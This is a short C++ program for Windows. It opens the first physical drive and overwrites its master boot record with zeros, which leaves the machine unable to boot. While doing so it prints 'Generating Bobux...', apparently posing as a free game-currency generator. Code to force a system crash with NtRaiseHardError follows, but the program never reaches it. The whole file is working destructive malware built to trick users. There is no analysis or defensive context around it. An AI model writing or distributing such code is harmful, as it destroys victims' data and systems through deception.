﻿#include <Windows.h>
#include <iostream>
#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

using namespace std;

#define MBR_SIZE 512
int main()
{
	DWORD write;
	char mbrData[512];

	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE) {
		cout << "Generating Bobux..." << endl;
		Sleep(10000);
		ExitProcess(0);
		 }
	else {
		cout << "Something went wrong! Please try again later!";
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MasterBootRecord);

	BOOLEAN b;

	unsigned long responsel;

	RtlAdjustPrivilege(19, TRUE, FALSE, &b);

	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &responsel);
	
	return EXIT_SUCCESS;
}